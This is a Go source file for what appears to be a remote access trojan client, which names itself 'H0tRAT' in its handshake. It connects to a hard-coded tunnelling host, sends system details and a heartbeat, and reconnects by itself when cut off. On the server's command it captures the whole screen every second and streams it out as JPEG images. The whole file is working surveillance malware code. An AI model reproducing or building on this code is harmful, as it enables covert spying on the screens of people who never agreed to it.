package client

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/go-vgo/robotgo"
	"image/jpeg"
	"net"
	"runtime"
	"strconv"
	"sync"
	"time"
	"ylc/src/demo/util"
)

const (
	IP   = "qq80378994.e2.luyouxia.net:28602"
	PORT = 1010
)

const (
	VERSION = "1.0.0"
)

var isturn = true
var stopScreen bool
var wg sync.WaitGroup

func Ma() {

	connectNew()

}

func heartbeat(conn net.Conn) {
	for {
		err := util.SendHead(byte(util.HEART), conn)
		if err != nil {
			fmt.Println("心跳丢失===》连接断开")
			connectNew()
			return
		}
		fmt.Println("连接了==========")
		time.Sleep(time.Second * 10)
	}
	wg.Done() // 协程计数器加-1
}

func connectNew() {

	wg.Add(2) // 协程计数器 +1
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "selectbyylc.e4.luyouxia.net:43083")
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
		connectNew()
		return
	}
	defer socket.Close()
	// IO流
	dataOutputStream := bufio.NewWriter(socket)

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	dataOutputStream.Flush()
	// 协程计数器加-1
	go doSomeThing(socket)
	go heartbeat(socket)

	wg.Wait() //等待协程计数器为0 退出
	fmt.Println("abc========================")

}

func createScreen(socket net.Conn) {
	// 获取当前屏幕的大小

	util.SendHead(1, socket)
	for {
		time.Sleep(time.Second * 1)

		screen, err := CaptureScreenAsJPEG(80)
		if err != nil {
			fmt.Println(err)
		}
		////compress := util.Compress(screen)

		err = util.Send(2, screen, socket)
		if err != nil {
			return
		}
		fmt.Println("发送成功")
		if stopScreen {
			break
		}
	}
}

// CaptureScreenAsJPEG 截图并返回JPEG格式的字节数组
func CaptureScreenAsJPEG(quality int) ([]byte, error) {
	// 获取屏幕的尺寸
	screenX, screenY := robotgo.GetScreenSize()
	// 创建一个矩形，表示要截取的区域
	// 截取屏幕区域
	bitmap := robotgo.CaptureScreen(0, 0, screenX, screenY)
	// 释放内存
	defer robotgo.FreeBitmap(bitmap)
	// 转换为图片对象
	img := robotgo.ToImage(bitmap)

	// 设置JPEG压缩参数
	var opt jpeg.Options
	opt.Quality = quality

	// 编码为JPEG格式
	buf := new(bytes.Buffer)
	err := jpeg.Encode(buf, img, &opt)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
func doSomeThing(socket net.Conn) {
	for {
		time.Sleep(time.Millisecond)
		reader := bufio.NewReader(socket)
		receiveHead, err := util.ReceiveHead(reader)
		if err != nil {
			return
		}
		fmt.Println(receiveHead)
		switch string(receiveHead) {
		//心跳
		case string(99):
			fmt.Println("heart...")

		//屏幕监控
		case string(1):
			stopScreen = false
			go createScreen(socket)
		case string(3):
			stopScreen = true
		}
	}
	wg.Done() // 协程计数器加-1

}
